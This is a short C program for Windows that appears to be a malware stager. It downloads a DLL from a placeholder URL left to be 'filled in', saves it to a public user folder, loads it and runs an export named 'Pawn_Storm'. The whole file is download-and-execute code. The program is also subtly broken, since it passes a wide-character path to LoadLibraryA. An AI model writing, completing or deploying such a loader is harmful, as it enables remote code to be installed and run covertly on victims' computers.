#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

typedef void (*Pawn_Storm)(void);


int main() {
    const wchar_t *url = L"https://example.com/rocke.dll"; // fill in when able ==================================================
    const wchar_t *out = L"C:\\Users\\Public\\Videos\\rocke.dll";

    URL_COMPONENTS uc = {0};
    uc.dwStructSize = sizeof(uc);

    wchar_t host[256], path[1024];
    uc.lpszHostName = host;
    uc.dwHostNameLength = _countof(host);
    uc.lpszUrlPath = path;
    uc.dwUrlPathLength = _countof(path);

    WinHttpCrackUrl(url, 0, 0, &uc);

    HINTERNET hSession = WinHttpOpen(L"Downloader/1.0",  
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, uc.lpszHostName, uc.nPort, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", uc.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            uc.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0);

    if(WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                          WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
       WinHttpReceiveResponse(hRequest, NULL)) {
        FILE *f = _wfopen(out, L"wb");
        DWORD bytes;
        char buffer[4096];
        while(WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytes) && bytes)
            fwrite(buffer, 1, bytes, f);
        fclose(f);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    HMODULE hDll = LoadLibraryA(out); // load DLL at runtime
    if (!hDll) {
        printf("Failed to load DLL\n");
        return 1;
    }
    Pawn_Storm func =(Pawn_Storm)GetProcAddress(hDll, "Pawn_Storm");
    if (!func) {
        printf("Function not found\n");
        return 1;
    }

    func();
    FreeLibrary(hDll);

    return 0;
}